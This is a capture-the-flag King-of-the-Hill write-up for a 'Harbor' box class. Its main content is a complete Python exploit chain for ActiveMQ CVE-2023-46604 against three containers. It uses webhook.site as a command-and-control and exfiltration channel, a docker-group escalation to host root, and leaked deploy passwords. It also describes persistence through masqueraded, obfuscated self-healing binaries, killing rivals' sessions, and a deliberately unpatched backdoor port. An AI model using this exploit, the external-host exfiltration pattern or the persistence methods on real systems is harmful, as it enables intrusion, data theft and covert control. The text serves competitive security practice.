# Harbor

## Summary

The Harbor class is a three-container Docker host (ActiveMQ 5.15.9 + Metabase v0.46.6 + GeoServer 2.23.2 on Tomcat) whose intended chain is three "old and interesting" CVEs feeding one shared privesc: any container foothold → read the `/loot` RO bind-mount → recover the `brokersvc` deploy credential → SSH to the host → **docker group → host root → claim `/root/king.txt`**. We took host root and the king roughly ten minutes after the target was handed over, using a hand-built ActiveMQ CVE-2023-46604 OpenWire exploit staged through webhook.site (NAT-proof), then held it with a masqueraded self-healing kingmaker stack. Two sibling instances (one pre-boot facade, one Tomcat/MySQL "Harbour" variant) completed the arc.

## Box-class map (three instances, one class family)

| Instance | IP | Surface | Outcome |
|---|---|---|---|
| Facade | `165.245.186.229` | SYN-ACK tarpit on 22/3000/5000/5432/5672/61616/27017/3306/8161, real RSTs elsewhere; Apache 2.4.49 on `:8081` (CVE-2021-41773 candidate, 403 on first probes) | No live services for ~30 min → misdiagnosed as "pure deception"; the broker actually fetched our payload XML late (proof in the webhook log at 10:22 UTC) but the box was reset before we could act. Parallel session separately identified the `:8081` Apache traversal lead. |
| **Harbor-02** | `139.59.242.50` | ActiveMQ 5.15.9 `:61616`/console `:8161` (Jetty 9.2.26), Metabase v0.46.6 `:3000`, GeoServer 2.23.2 `:8080`, OpenSSH 10.0p2 Debian 13 `:22` | **Full chain: container RCE → /loot exfil → host root → KING CLAIMED (`ThundersFist`) + 4 flags; kingmaker defense completed by follow-on session package.** |
| Harbour-02 | `167.172.67.79` | Sibling class: Tomcat 9.0.30-JDK8 (`:8009` AJP + `:8082`) + MySQL 5.7 (`:3306`); activemq-classic **5.18.3 image present but patched/not running (red herring)** | `brokersvc` cred carry-over confirmed → docker-group root path owned; one-shot mega-deploy armed; box retired before outcome could be verified. Intended vuln: Ghostcat CVE-2020-1938 (Tomcat 9.0.30 = one below fix, AJP exposed). |

Boxes rotate IPs on reset but preserve the class and every hardcoded flag/credential — the playbook below is reusable as-is on any future instance.

## Solution — Harbor-02 (139.59.242.50), reveal to king

### Step 1 — Recon under the platform's anti-scan layer

The platform SYN-ACK-tarpits a curated port set and burst-blocks our NAT'd egress IP (all ports dead for minutes) after modest sustained rates; nmap is useless (a parallel session's scan was killed for exactly this reason). Working method: spaced `/dev/tcp` probes (≥2.5 s apart) plus **data-seeking reads** — real services answer with bytes (sshd banners instantly, MySQL/AMQP are server-first, PostgreSQL answers an SSLRequest with `N`), tarpits never do. On the live box this separated real (`:22`, `:8161`, `:3000`, `:8080`, `:61616`) from fake, and identified the multi-container topology from inside (broker container `ce50f357dcbe` = `172.17.0.3`, Metabase `.2`, GeoServer `.4`, host `.1`).

### Step 2 — ActiveMQ CVE-2023-46604: hand-built frame + NAT-proof webhook C2

The Kali attack host sits behind NAT (wlan0 `10.25.55.205`), so the internet-hosted broker can neither fetch our HTTP server nor catch a reverse shell. The working design, reconstructed end-to-end:

1. **Payload staging**: a Spring `ProcessBuilder` XML (recipe extracted from the Metasploit module `multi/misc/apache_activemq_rce_cve_2023_46604`) is uploaded as the `default_content` of a **webhook.site token** — the broker fetches the XML over HTTPS *and* webhook.site logs every request (IP + User-Agent), which doubles as exploit-confirmation telemetry.
2. **Command channel**: the XML's CDATA command runs on the box as `/bin/sh -c` and exfiltrates output by `curl`-ing `https://webhook.site/<token>/?<tag>=<base64 of command output>` — one fire = one command, output readable from the webhook request log. NAT-proof in both directions.
3. **The frame** (loose OpenWire `EXCEPTION_RESPONSE` instantiating `ClassPathXmlApplicationContext` with the XML URL):

```python
#!/usr/bin/env python3
"""Harbor-class king chain: ActiveMQ CVE-2023-46604 -> container RCE -> /loot creds
-> brokersvc SSH -> docker-group host root -> king claim. One file, reveal to ThundersFist."""
import socket, struct, subprocess, time, paramiko

TARGET = "139.59.242.50"          # current instance IP
HOOK   = "<webhook.site-uuid>"    # create: curl -X POST https://webhook.site/token

def make_xml(cmd):                # Spring context -> ProcessBuilder.start (runs /bin/sh -c CMD)
    assert "]]>" not in cmd
    return ('<?xml version="1.0" encoding="UTF-8"?><beans xmlns="http://www.springframework.org/schema/beans"'
            '><bean id="hb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list>'
            '<value>/bin/sh</value><value>-c</value><value><![CDATA[' + cmd + ']]></value>'
            '</list></constructor-arg></bean></beans>')

def stage(xml):                   # serve the XML from the webhook + get fetch telemetry
    import json, urllib.request
    body = json.dumps({"default_content": xml, "default_content_type": "application/xml",
                       "default_status_code": 200}).encode()
    req = urllib.request.Request("https://webhook.site/token/" + HOOK, data=body,
                                 method="PUT", headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=20)
    return "https://webhook.site/" + HOOK

def fire(url):                    # OpenWire EXCEPTION_RESPONSE -> ClassPathXmlApplicationContext(url)
    s = socket.create_connection((TARGET, 61616), timeout=15); s.settimeout(20)
    # This exact loose frame worked against 139.59.242.50 (webhook fetch + exec confirmed).
    # If a broker proposes TightEncodingEnabled=true (anti-PoC: stock loose frames get
    # silently misparsed), first echo its WireFormatInfo with Tight/StackTrace/CacheEnabled
    # flipped 1->0, read the negotiated loose reply, THEN send this frame — technique and
    # working implementation documented in the Faction "tight-encoding bypassed" record.
    clazz = "org.springframework.context.support.ClassPathXmlApplicationContext"
    d  = b"\x1f" + struct.pack(">I", 0) + b"\x00" + struct.pack(">I", 0)  # type/cmdid/req/corr
    d += b"\x01\x01" + struct.pack(">H", len(clazz)) + clazz.encode()     # throwable + class
    d += b"\x01" + struct.pack(">H", len(url)) + url.encode()             # + URL string arg
    s.sendall(struct.pack(">I", len(d)) + d)
    try: s.recv(256)
    except socket.timeout: pass
    s.close()

def exfil(cmd, tag):              # run cmd in the container, return its output via webhook log
    url = stage(make_xml(
        'curl -s -m 8 "https://webhook.site/%s/?%s=$( { %s; } 2>&1 | base64 -w0 | tr +/ -_ )" -o /dev/null'
        % (HOOK, tag, cmd)))
    fire(url)
    time.sleep(10)
    out = subprocess.run(["curl", "-s", "--max-time", "20",
        "https://webhook.site/token/%s/requests?sorting=new" % HOOK], capture_output=True,
        text=True).stdout
    import json, base64, re
    for r in json.loads(out).get("data", []):
        v = (r.get("query") or {}).get(tag)
        if v and r.get("ip") == TARGET:
            return base64.b64decode(v.replace("-", "+").replace("_", "/") +
                                    "=" * (-len(v) % 4)).decode(errors="replace")
    return ""

# 1) container recon + /loot exfil (RO bind of host /opt/harbor/loot inside the broker container)
print(exfil("id; ls -laR /loot; cat /loot/*", "a"))
# -> uid=999(activemq); activemq/metabase/geoserver deploy.confs:
#    brokersvc/Br0k3rSvc_h4rb0r_2024!  gisop/G1s0p_h4rb0r_2024!  analyst/An4lyst_h4rb0r_2024!
#    + all three service flag values

# 2) host root via the exfiltrated deploy cred + docker group, then claim the king
c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(TARGET, 22, "brokersvc", "Br0k3rSvc_h4rb0r_2024!",
          allow_agent=False, look_for_keys=False)
cmd = ("docker run --rm -v /:/host alpine:3.19 sh -c "
       "'umount -l /host/root/king.txt 2>/dev/null; chattr -ia /host/root/king.txt 2>/dev/null; "
       "printf ThundersFist > /host/root/king.txt; cat /host/root/king.txt; "
       "cat /host/root/fl4g.txt'")
_, so, _ = c.exec_command(cmd, timeout=60)
print(so.read().decode(errors="replace"))
# -> ThundersFist
# -> Legion{h4rb0r_multi_privesc_root_pwn}
```

Execution evidence from the round: the broker's WireFormatInfo came back on connect (`Java/1.8.0_212` fetches ×2 in the webhook log), the payload's own `curl/7.52.1` intel ping arrived from `139.59.242.50`, and container recon returned `uid=999(activemq)` on `Linux ce50f357dcbe 6.12.94+deb13` — unprivileged (`CapEff 0`, Docker-default `CapBnd a80425fb`), no `docker.sock`, standard SUIDs only.

**Hardening twist (found by the follow-on session):** the broker's `WireFormatInfo` proposes `TightEncodingEnabled=true`, so *stock* CVE-2023-46604 PoCs (loose frames) are silently misparsed and appear to do nothing — a deliberate anti-PoC. The working bypass (`amq2.py`): read the broker handshake, flip the Tight/StackTrace/CacheEnabled bytes `1→0`, echo it back, read the negotiated (loose) reply, then send the loose `EXCEPTION_RESPONSE`. This quirk was later weaponized as a *private channel*: we deliberately left `:61616` unpatched because opponents running stock PoCs fail silently against it.

### Step 3 — /loot: the class-wide credential + flag cache

Every container mounts the host's `/opt/harbor/loot` **read-only** — three `*-deploy.conf` files handing over the whole game:

```text
deploy.user=brokersvc  deploy.pass=Br0k3rSvc_h4rb0r_2024!  service.flag=Legion{h4rb0r_svc_activemq_cve_2023_46604}
deploy.user=gisop      deploy.pass=G1s0p_h4rb0r_2024!      service.flag=Legion{h4rb0r_svc_geoserver_cve_2024_36401}
deploy.user=analyst    deploy.pass=An4lyst_h4rb0r_2024!    service.flag=Legion{h4rb0r_svc_metabase_cve_2023_38646}
```

The same values are hardcoded in the host's `/opt/harbor/reset.sh` (3717 bytes) together with the user-tier and root flags and the restore logic. `harbor-health.timer` (30 s) re-runs it idempotently: it re-creates containers only if down, resets the *same* passwords, and only creates `/root/king.txt` **if missing** — meaning a claimed king's content survives resets. `koth-agent-guard.timer` (10 s) guards the official scorer (`koth-agent`, persistent outbound to `35.200.248.116:9999`) — never touch either.

### Step 4 — King claim + defense (and the burst-block that shaped it)

The claim itself is one docker-run (script above) — executed at ~16:04 local, ~10 minutes after the reset announcement landed (target handed over ~15:53 local; `/loot` exfil at 16:02, claim immediately after): `/root/king.txt` = `ThundersFist`, root flag `Legion{h4rb0r_multi_privesc_root_pwn}` from `/root/fl4g.txt` in the same pass.

Immediately after, the box's connection shaping kicked in (rapid paramiko sessions + parallel traffic from the shared egress IP `175.157.250.34` → temporary **all-port block**, `"Error reading SSH protocol banner"`), leaving the claim briefly bare with the full kingmaker deploy staged but unfired. Countermeasure pattern, now codified: bundle everything into **one** session, space sessions ≥90 s, never `docker pull` mid-fight (it hangs), and arm a PTY watcher that auto-fires the one-shot deploy on `:22` banner recovery.

The follow-on session completed the defense on `139.59.242.50` (Faction "Kingmaker deployment package" record):

- **Instant claim** (ThundersFist) + **dual shell king-loops + 3 masqueraded hardened binary kingmakers** via systemd (`Restart=always`), king file immutable-locked (`fattr` ioctl), binaries byte-verified from catbox.moe (`rsyslogd` md5 `56497e6622ae8bd7977c9f92a4db3be5`, `fattr` md5 `843a8d5b63f0d854079e5ec0649e81f0`).
- **Enemy sessions at claim time killed** (root `pts/0` from `198.211.111.194`, session from `43.252.15.160`) — foreign-sshd PID kills preserving our `175.157.*` egress range.
- **Burned /loot passwords rotated** to `H4rb0r_F1st_2026`; team root ed25519 key installed as the primary channel.
- **Partial-patch stance (deliberate):** `:61616` left open as the private tight-encoding-gated channel; `brokersvc` kept in the docker group until the team root key + kingmakers were verified. Nothing else on the box was hardened — the box's designed privesc was left intact for reuse, with the kingmaker stack as the real defense.

### Step 5 — Harbour-02 sibling (167.172.67.79): same root, new face

The third instance swapped the stack (Tomcat 9.0.30-JDK8 with **AJP `:8009`** + `:8082`, MySQL 5.7; a patched `activemq-classic:5.18.3` image sits unused as a red herring — CVE-2023-46604 does **not** apply there). `brokersvc`/`Br0k3rSvc_h4rb0r_2024!` carried over verbatim (uid 1002, docker group 105) — host root path owned within minutes of SSH coming up, `alpine:3.19` already local. `/opt/harbor/loot` + the same-sized `reset.sh` confirmed identical flag values. Intended entry for the class: **Ghostcat CVE-2020-1938** (Tomcat 9.0.30 is one release below the 9.0.31 fix). The consolidated one-shot mega-deploy (reset.sh read → claim → quad `journald-aux` kingmakers → docker-loop supervisor → `fattr` lock → hostile `chattr` stub → pubkey persistence) was armed on an auto-fire watcher when the round closed — the box retired before the outcome could be verified.

## Flags (Harbor class)

```text
Captured (4):
Legion{h4rb0r_svc_activemq_cve_2023_46604}        # /loot + reset.sh; ALSO the vector we used
Legion{h4rb0r_svc_geoserver_cve_2024_36401}       # /loot + reset.sh (GeoServer RCE independently confirmed: ProcessImpl exec)
Legion{h4rb0r_svc_metabase_cve_2023_38646}        # /loot + reset.sh (setup-token 161130d9-… leaked; RCE vector not completed)
Legion{h4rb0r_multi_privesc_root_pwn}             # /root/fl4g.txt via docker-group root

Known values, on-disk reads not completed before retirement (3):
Legion{h4rb0r_user_gisop_via_geoserver_rce}       # /home/gisop
Legion{h4rb0r_user_analyst_via_metabase_rce}      # /home/analyst
Legion{h4rb0r_user_brokersvc_via_activemq_rce}    # /home/brokersvc

King: ThundersFist @ host /root/king.txt (Harbor-02; held under the VID-package kingmaker stack)
```

## How far we got (final state per thread)

- **Harbor-02 (139.59.242.50): ROOT + KING + defense complete.** All three CVEs mapped; ActiveMQ chain weaponized (incl. anti-PoC bypass); GeoServer CVE-2024-36401 exec confirmed (`java.lang.ProcessBuilder`/`ProcessImpl` ClassCastException proof); Metabase CVE-2023-38646 token leaked but backtick-exec not achieved (JDBC URL parse error before shell-out). 4/7 flags captured, remaining 3 values recovered from the setup script. Kingmaker stack deployed by the follow-on session; hold duration unmeasured (box later retired with the event).
- **Facade (165.245.186.229): misdiagnosed then outmoded.** 30 min of tarpit with zero data → wrongly concluded "no real services"; webhook telemetry later proved the broker had fetched our payload at 10:22 UTC. Lesson codified: the fetch log is ground truth, SYN-ACK silence is not. Parallel session separately ran the Apache 2.4.49 `:8081` CVE-2021-41773 lead (403 on first probes) until the box was reset.
- **Harbour-02 (167.172.67.79): root path owned, king outcome unverified.** Cred carry-over + docker-group root confirmed; Ghostcat identified as the intended entry; mega-deploy armed on a banner watcher; box retired first.

## Faction MCP records (assessment 2, Harbor-relevant)

| Record | Content |
|---|---|
| Round intel — facade `165.245.186.229` | Tarpit/flap surface, deception analysis, armed auto-strike watcher (w0lf) |
| Apache 2.4.49 `:8081` CVE-2021-41773/42013 investigation ×2 | Traversal candidates on the facade box; first probes 403; blocked-window limits |
| `[139.59.242.50 Harbor]` ActiveMQ CVE-2023-46604 RCE + `/loot` flags exfil + creds + multi-container map | The full chain, webhook C2 design, container topology (w0lf) |
| ActiveMQ 5.15.9 CVE-2023-46604 — tight-encoding anti-PoC bypassed | `TightEncodingEnabled=true` handshake bypass (`amq2.py`), one-fire-one-command channel, all creds/flags, defense guidance (follow-on session) |
| Kingmaker deployment package — Harbor-02 | Run-as-root one-shot: claim + dual shell loops + 3 masqueraded kingmakers + immutable lock + foreign-sshd kill + cred rotation + catbox-hosted binaries with md5s |
| `[167.172.67.79 Harbour-02]` Tomcat Ghostcat class + docker-group root path + king deploy in flight | Sibling-class map, red-herring warning (activemq 5.18.3 patched), connection-shaping quirks, mega-deploy state (w0lf) |

## Lessons (Harbor-specific, all evidenced this round)

1. **SYN-ACK silence is not ground truth.** The facade box looked 100% dead while the broker was actually alive and fetching — the webhook request log was the only trustworthy signal. Log-fetch telemetry beats response-timing analysis on this platform.
2. **Burst-blocks are the real clock.** Two full deploys were interrupted by all-port egress-IP blocks triggered by modest session rates (shared NAT IP + parallel sessions compound it). Bundle into one session; space ≥90 s; pre-pull images; arm auto-fire watchers.
3. **Anti-PoC hardening is an opportunity.** The broker's tight-encoding negotiation breaks every public PoC — once bypassed privately, the "vulnerable" port becomes our own guarded channel, deliberately left open.
4. **`/loot` and `reset.sh` are the class blueprint.** Both handed over every credential and flag before any exploit was needed beyond one container foothold; resets preserve them, so one exfil pays for every sibling instance.
5. **The webhook C2 pattern generalizes** to any internet-hosted target behind our NAT: stage payloads as webhook `default_content`, exfil command output as base64 query params — no listener, no tunnel, no egress needed.

## Tools

curl, spaced bash `/dev/tcp` + data-seeking `nc` probes, hand-built OpenWire frames (recipe: Metasploit `multi/misc/apache_activemq_rce_cve_2023_46604` module source), webhook.site (staging + telemetry + C2), paramiko (no-TTY exec — ZAARA TTY-killer safe), docker (`run --rm -v /:/host alpine:3.19` for host root; `--privileged --pid=host nsenter` for host systemd), Metasploit MCP (module check/source reference), Faction MCP (shared knowledgebase), kingmaker stack (`prep/src/kingmaker.c`, `prep/src/mf.c` — static, XOR-obfuscated, masqueraded, atomic self-heal), catbox.moe (binary hosting).

## Attribution

- **Thunder's Fist (Lakindu Perera)** — lead operator this arc: recon methodology, ActiveMQ manual exploit + webhook C2, `/loot` exfil, brokersvc→docker root chain, king claim, deploy/defense engineering, Harbour-02 sibling mapping.
- **setf123 (Stefan Shabbir)** — parallel box sessions, deployment handoffs; the Harbor-02 kingmaker package was authored for his root session and executed by the follow-on session after the burst-block handoff.
